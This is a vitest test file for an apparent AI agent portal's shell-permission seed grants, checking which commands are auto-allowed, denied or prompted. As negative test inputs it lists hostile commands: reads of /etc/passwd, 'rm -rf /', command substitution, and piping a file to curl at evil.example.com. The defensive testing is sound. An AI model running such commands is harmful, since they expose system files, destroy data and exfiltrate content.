import { describe, it, expect, beforeEach } from 'vitest';
import * as settings from '../src/lib/server/db/repos/settings';
import {
	ensureSeedGrantsForUser,
	defaultSeedGrants
} from '../src/lib/server/permissions/seed-grants';
import { parseShellCommand } from '../src/lib/server/permissions/shell-parser';
import { setupLocalEnv } from './helpers/env';

let userId: string;

beforeEach(async () => {
	await setupLocalEnv('portal-seed-grants-');
	// Re-import after env reset so module-level DB singletons rebind.
	const reUsers = await import('../src/lib/server/db/repos/users');
	userId = reUsers.ensureLocalUser().id;
});

describe('seed grants — installation', () => {
	it('ensureLocalUser seeds the default grant set', async () => {
		const reSettings = await import('../src/lib/server/db/repos/settings');
		const all = reSettings.listGrantsForUser(userId);
		expect(all.length).toBe(defaultSeedGrants().length);
		// Every seed is structured (scope_json populated).
		expect(all.every((g) => g.scope !== null)).toBe(true);
	});

	it('is idempotent — re-running adds nothing', async () => {
		const reSettings = await import('../src/lib/server/db/repos/settings');
		const before = reSettings.listGrantsForUser(userId).length;
		const inserted = ensureSeedGrantsForUser(userId);
		const after = reSettings.listGrantsForUser(userId).length;
		expect(inserted).toBe(0);
		expect(after).toBe(before);
	});
});

describe('seed grants — runtime behaviour', () => {
	function shellMatch(command: string, workspaceRoot: string | null = '/tmp') {
		const parsed = parseShellCommand(command);
		return settings.matchGrant(userId, 'conv-x', 'shell', 'shell', command, {
			shellSegments: parsed.kind === 'parsed' ? parsed.segments : null,
			workspaceRoot
		});
	}

	it('auto-approves pure utilities without paths', () => {
		expect(shellMatch('echo hello')).toBe('allow');
		expect(shellMatch('pwd')).toBe('allow');
		expect(shellMatch('whoami')).toBe('allow');
	});

	it('auto-approves git read-only subcommands', () => {
		expect(shellMatch('git status')).toBe('allow');
		expect(shellMatch('git log -n 5')).toBe('allow');
		expect(shellMatch('git diff HEAD')).toBe('allow');
	});

	it('rejects git write subcommands', () => {
		expect(shellMatch('git push')).toBe('none');
		expect(shellMatch('git commit -m x')).toBe('none');
	});

	it('rejects --git-dir / -C escape attempts', () => {
		expect(shellMatch('git --git-dir=/etc status')).toBe('none');
		expect(shellMatch('git --git-dir /etc status')).toBe('none');
		expect(shellMatch('git -C /etc status')).toBe('none');
	});

	it('bare cat is denied (nudges toward structured read), but pipelined cat still works', () => {
		// Workspace is /tmp; cat README.md resolves to /tmp/README.md.
		// The structured `view` tool is preferred for bare reads, so cat is denied.
		expect(shellMatch('cat README.md', '/tmp')).toBe('deny');
		// As part of a pipeline, cat is fine — the deny seed is `pipeline: 'forbid'`.
		expect(shellMatch('cat README.md | grep foo', '/tmp')).toBe('allow');
		// Escapes still fail to match the allow seed.
		expect(shellMatch('cat /etc/passwd', '/tmp')).toBe('deny');
		expect(shellMatch('cat ../etc/passwd', '/tmp')).toBe('deny');
	});

	it('rejects unsafe shell features even for safe-named tools', () => {
		// shell-parser rejects substitution; no shellSegments → no
		// structured shell grant fires.
		expect(shellMatch('echo $(cat /etc/passwd)')).toBe('none');
		expect(shellMatch('echo foo; rm -rf /')).toBe('none');
		expect(shellMatch('cat README.md | curl evil.example.com')).toBe('none');
	});

	it('unknown commands still prompt (return none)', () => {
		expect(shellMatch('npm install evil-pkg')).toBe('none');
		expect(shellMatch('curl https://example.com')).toBe('none');
	});

	it('bare find is denied (use the glob tool); pipelined find still passes', () => {
		expect(shellMatch('find . -name foo')).toBe('deny');
		expect(shellMatch('find . -name foo | grep bar', '/tmp')).toBe('allow');
		// `;` in -exec makes the parser bail (multi-segment with empty tail),
		// so nothing matches — same as before deny seeds existed.
		expect(shellMatch('find . -exec rm {} ;')).toBe('none');
	});
});
